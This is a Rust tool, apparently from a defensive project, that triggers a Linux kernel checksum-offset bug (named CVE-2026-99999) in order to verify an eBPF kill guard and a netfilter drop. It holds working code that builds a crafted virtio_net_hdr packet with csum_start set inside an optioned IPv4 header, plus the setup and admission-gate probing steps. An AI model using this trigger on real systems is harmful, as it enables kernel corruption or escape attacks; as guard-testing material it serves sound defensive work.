//! PwnEscape (CVE-2026-99999) trigger used to verify the eBPF guard.
//!
//! Injects a guest-style packet through a tun device: a `virtio_net_hdr` whose
//! `NEEDS_CSUM` metadata points at the start of the IPv4 header, followed by a
//! large UDP datagram. The kernel accepts it, the IP stack forwards it to a
//! veth with a small MTU, and `ip_do_fragment()` completes the checksum via
//! `skb_checksum_help()` - the call site the guard is attached to and the one
//! upstream commit 6785011f8b16 patches.
//!
//! This program creates the tun device itself (address/MTU aside, everything
//! it needs is ioctls). The low-MTU output device and its route are set up by
//! the caller, e.g.:
//!
//! ```text
//! ip link add pv0 type veth peer name pv1
//! ip link set pv0 mtu 576 up
//! ip link set pv1 up
//! ip route add 10.99.98.0/24 dev pv0
//! ip neigh replace 10.99.98.2 lladdr $(cat /sys/class/net/pv1/address) dev pv0 nud permanent
//! ```
//!
//! (The static neighbour entry matters: without it the fragments are held in
//! the unresolved ARP queue and never reach the peer.)
//!
//! Two kernel-side gates shape the packet:
//!
//! * `virtio_net_hdr_to_skb()` rejects `csum_start < network_header + 20`
//!   (`sizeof(struct iphdr)`) with `EINVAL` on kernels that carry the newer
//!   transport-offset check. It compares against the constant 20, not the
//!   packet's actual IHL, so the default `trigger` variant uses a 24-byte IPv4
//!   header (IHL=6: three NOPs + EOL) with `csum_start = 20`: admission
//!   passes, yet the deferred checksum write still lands on header bytes the
//!   kernel already validated (`20 < 24`).
//! * Source validation (`__fib_validate_source()` with `accept_local=0`)
//!   drops packets whose source is one of the node's own addresses, so the tun
//!   takes 10.99.99.254/24 while the packet claims src 10.99.99.1.
//!
//! The tun write delivers synchronously in this process's context on arm64
//! (`tun_rx_batched()`: `local_bh_disable(); netif_receive_skb()`), so with
//! the default PREROUTING drop layer the packet is rejected before the checksum
//! completion: the write succeeds, this process survives, and the DaemonSet
//! logs a `CVE-2026-99999 REJECTED` event. With `--no-netfilter-drop` the
//! kprobe guard's `SIGKILL` lands on this process instead: the shell reports
//! exit status 137 and the DaemonSet logs `CVE-2026-99999 KILLED`. With
//! `--observe`, or on kernels/paths that complete in softirq, the packet is
//! still forwarded and reported but nobody is killed.
//!
//! Build (macOS host, repo root):
//!
//! ```text
//! TC=$(rustup show active-toolchain | awk '{print $1}')
//! PATH="$HOME/.cargo/bin:$HOME/.local/bin:$HOME/.rustup/toolchains/$TC/lib/rustlib/aarch64-apple-darwin/bin:$PATH" \
//!   rustc --target aarch64-unknown-linux-musl -O tools/csum-trigger.rs -o /tmp/csum-trigger
//! ```

use std::env;
use std::io;
use std::os::raw::{c_char, c_int, c_void};
use std::process;

// --- constants ---------------------------------------------------------------

const AF_INET: c_int = 2;
const SOCK_DGRAM: c_int = 2;
const O_RDWR: c_int = 0o2;

const SIOCSIFADDR: u64 = 0x8916;
const SIOCSIFNETMASK: u64 = 0x891c;
const SIOCGIFFLAGS: u64 = 0x8913;
const SIOCSIFFLAGS: u64 = 0x8914;

const IFF_UP: u16 = 0x0001;

const IFF_TUN: u16 = 0x0001;
const IFF_NO_PI: u16 = 0x1000;
const IFF_VNET_HDR: u16 = 0x4000;
/// `_IOW('T', 202, int)` - set (or attach to) a tun/tap device.
const TUNSETIFF: u64 = 0x4004_54ca;
/// `_IOW('T', 220, int)` / `_IOR('T', 221, int)` - virtio header endianness.
/// Kernels built with `CONFIG_TUN_VNET_CROSS_LE` default to the legacy
/// big-endian layout, so a little-endian (virtio 1.0) sender must opt in.
const TUNSETVNETLE: u64 = 0x4004_54dc;
const TUNGETVNETLE: u64 = 0x8004_54dd;

/// `VIRTIO_NET_HDR_F_NEEDS_CSUM`.
const VIRTIO_NET_HDR_F_NEEDS_CSUM: u8 = 1;

const IP_LEN: usize = 1400;


// --- libc --------------------------------------------------------------------

extern "C" {
    fn socket(domain: c_int, ty: c_int, proto: c_int) -> c_int;
    fn ioctl(fd: c_int, request: u64, arg: *mut c_void) -> c_int;
    fn open(path: *const c_char, flags: c_int) -> c_int;
    fn write(fd: c_int, buf: *const c_void, count: usize) -> isize;
    fn close(fd: c_int) -> c_int;
}

// --- small helpers -----------------------------------------------------------

fn die(ctx: &str) -> ! {
    eprintln!("csum-trigger: {ctx}: {}", io::Error::last_os_error());
    process::exit(2);
}

/// A `struct ifreq` (40 bytes) with `name` filled in.
fn ifreq(name: &str) -> [u8; 40] {
    assert!(name.len() < 16, "interface name too long");
    let mut buf = [0u8; 40];
    buf[..name.len()].copy_from_slice(name.as_bytes());
    buf
}

fn put_u16(buf: &mut [u8], off: usize, v: u16) {
    buf[off..off + 2].copy_from_slice(&v.to_le_bytes());
}

fn put_u16_be(buf: &mut [u8], off: usize, v: u16) {
    buf[off..off + 2].copy_from_slice(&v.to_be_bytes());
}

/// IPv4 header checksum (RFC 1071) over a 20-byte header with a zeroed field.
fn ipv4_header_csum(header: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    for chunk in header.chunks_exact(2) {
        sum += u32::from(u16::from_be_bytes([chunk[0], chunk[1]]));
    }
    while sum >> 16 != 0 {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    !(sum as u16)
}

// --- setup -------------------------------------------------------------------

/// Create the tun device and give it a /24 address, all via ioctls.
fn create_tun(name: &str, addr: [u8; 4], netmask: [u8; 4]) -> c_int {
    let path = b"/dev/net/tun\0";
    let tun = unsafe { open(path.as_ptr().cast::<c_char>(), O_RDWR) };
    if tun < 0 {
        die("open(/dev/net/tun)");
    }

    let mut req = ifreq(name);
    put_u16(&mut req, 16, IFF_TUN | IFF_NO_PI | IFF_VNET_HDR);
    if unsafe { ioctl(tun, TUNSETIFF, req.as_mut_ptr().cast::<c_void>()) } < 0 {
        die("ioctl(TUNSETIFF)");
    }

    // Virtio 1.0 headers are little-endian. With CONFIG_TUN_VNET_CROSS_LE
    // (as built here) the device starts in the legacy big-endian mode, in
    // which csum_offset=6 is read as 0x0600 and tun_get_user() rejects the
    // packet with EINVAL, so opt in explicitly.
    let mut le: c_int = 0;
    if unsafe { ioctl(tun, TUNGETVNETLE, (&mut le as *mut c_int).cast::<c_void>()) } < 0 {
        die("ioctl(TUNGETVNETLE)");
    }
    if le == 0 {
        let mut one: c_int = 1;
        if unsafe { ioctl(tun, TUNSETVNETLE, (&mut one as *mut c_int).cast::<c_void>()) } < 0 {
            die("ioctl(TUNSETVNETLE)");
        }
        println!("[trigger] switched {name} virtio headers to little-endian");
    }

    let ctl = unsafe { socket(AF_INET, SOCK_DGRAM, 0) };
    if ctl < 0 {
        die("socket(AF_INET)");
    }

    for (request, value) in [
        (SIOCSIFADDR, addr),
        (SIOCSIFNETMASK, netmask),
    ] {
        let mut req = ifreq(name);
        put_u16(&mut req, 16, AF_INET as u16); // sockaddr_in.sin_family
        req[20..24].copy_from_slice(&value); // sin_addr (network order)
        if unsafe { ioctl(ctl, request, req.as_mut_ptr().cast::<c_void>()) } < 0 {
            die("ioctl(SIOCSIFADDR/SIOCSIFNETMASK)");
        }
    }

    let mut req = ifreq(name);
    if unsafe { ioctl(ctl, SIOCGIFFLAGS, req.as_mut_ptr().cast::<c_void>()) } < 0 {
        die("ioctl(SIOCGIFFLAGS)");
    }
    let flags = u16::from_le_bytes([req[16], req[17]]) | IFF_UP;
    put_u16(&mut req, 16, flags);
    if unsafe { ioctl(ctl, SIOCSIFFLAGS, req.as_mut_ptr().cast::<c_void>()) } < 0 {
        die("ioctl(SIOCSIFFLAGS)");
    }

    unsafe { close(ctl) };
    tun
}

// --- the packet --------------------------------------------------------------

/// `[virtio_net_hdr][IPv4/UDP datagram]`.
///
/// Two shapes matter for CVE-2026-99999 on this kernel:
///
/// * `Ihl::Options` - 24-byte IPv4 header (4 option bytes) with
///   `csum_start = 20`. The kernel's virtio admission gate only rejects
///   `csum_start < network_header + sizeof(struct iphdr)`, i.e. `start < 20`,
///   while the vulnerable condition at completion time is
///   `csum_start < network_header + ip_hdrlen(skb)` = `20 < 24`: the deferred
///   checksum write still lands inside already-validated header bytes.
/// * `Ihl::Plain` - 20-byte header; used for control runs and for bisecting
///   the admission gate (`start < 20` is rejected with EINVAL).
fn build_packet(ihl: usize, csum: Option<(u16, u16)>) -> Vec<u8> {
    let hlen = ihl * 4;
    let mut buf = vec![0u8; 10 + IP_LEN];

    // struct virtio_net_hdr (legacy 10-byte layout).
    if let Some((start, off)) = csum {
        buf[0] = VIRTIO_NET_HDR_F_NEEDS_CSUM;
        put_u16(&mut buf, 6, start); // csum_start: relative to the network header
        put_u16(&mut buf, 8, off); // csum_offset
    }
    buf[1] = 0; // gso_type = VIRTIO_NET_HDR_GSO_NONE
    put_u16(&mut buf, 2, 0); // hdr_len
    put_u16(&mut buf, 4, 0); // gso_size

    let ip = 10;
    buf[ip] = 0x40 | (ihl as u8); // version 4, ihl
    buf[ip + 1] = 0; // tos
    put_u16_be(&mut buf, ip + 2, IP_LEN as u16);
    put_u16_be(&mut buf, ip + 4, 0x4242); // id
    put_u16_be(&mut buf, ip + 6, 0); // no DF: the packet may fragment
    buf[ip + 8] = 64; // ttl
    buf[ip + 9] = 17; // UDP
    buf[ip + 12..ip + 16].copy_from_slice(&[10, 99, 99, 1]);
    buf[ip + 16..ip + 20].copy_from_slice(&[10, 99, 98, 2]);
    for (i, b) in buf[ip + 20..ip + hlen].iter_mut().enumerate() {
        // Three NOPs and an End-Of-List: valid, inert options.
        *b = if i < 3 { 1 } else { 0 };
    }
    let csum = ipv4_header_csum(&buf[ip..ip + hlen]);
    put_u16_be(&mut buf, ip + 10, csum);

    let udp = ip + hlen;
    let udp_len = IP_LEN - hlen;
    put_u16_be(&mut buf, udp, 4242);
    put_u16_be(&mut buf, udp + 2, 5353);
    put_u16_be(&mut buf, udp + 4, udp_len as u16);
    put_u16_be(&mut buf, udp + 6, 0);
    for b in &mut buf[udp + 8..] {
        *b = 0x41;
    }

    buf
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let name = args.get(1).map(String::as_str).unwrap_or("pescape0");
    if args.len() > 4 {
        eprintln!("usage: csum-trigger [tun-name] [trigger|none|start] [offset]");
        process::exit(2);
    }
    let (ihl, csum, label) = match args.get(2).map(String::as_str) {
        None | Some("trigger") => (6usize, Some((20u16, 0u16)), "with IP options: csum_start=20 < network_header + 24"),
        Some("none") => (5, None, "no NEEDS_CSUM (control)"),
        Some(start) => {
            let start: u16 = start.parse().unwrap_or_else(|_| {
                eprintln!("csum-trigger: bad csum start");
                process::exit(2);
            });
            let off: u16 = args.get(3).map(|s| s.parse().unwrap_or(6)).unwrap_or(6);
            (5, Some((start, off)), "admission-gate probe")
        }
    };

    // The tun stands in for the attacker's link. Its address must NOT be the
    // packet's source: a locally-owned source address arriving on a non-loop
    // interface is dropped by __fib_validate_source() (accept_local=0), long
    // before the packet can be forwarded. 10.99.99.254/24 leaves 10.99.99.1
    // as an ordinary on-link source.
    let tun = create_tun(name, [10, 99, 99, 254], [255, 255, 255, 0]);
    println!("[trigger] {name} up with 10.99.99.254/24 (fd {tun}), packet src 10.99.99.1");

    let buf = build_packet(ihl, csum);
    match csum {
        Some((start, off)) => println!(
            "[trigger] writing {} bytes: NEEDS_CSUM, ihl={ihl}, csum_start={start}, \
             csum_offset={off}, {} byte datagram ({label})",
            buf.len(),
            IP_LEN
        ),
        None => println!(
            "[trigger] writing {} bytes: ihl={ihl}, {} byte datagram ({label})",
            buf.len(),
            IP_LEN
        ),
    }

    let n = unsafe { write(tun, buf.as_ptr().cast::<c_void>(), buf.len()) };
    if n < 0 {
        die("write(tun)");
    }
    println!(
        "[trigger] wrote {n} bytes and survived - no kill: this was a control run, the \
         PREROUTING drop rejected the packet, the guard is in observe mode, or completion ran \
         outside a killable process context"
    );
}
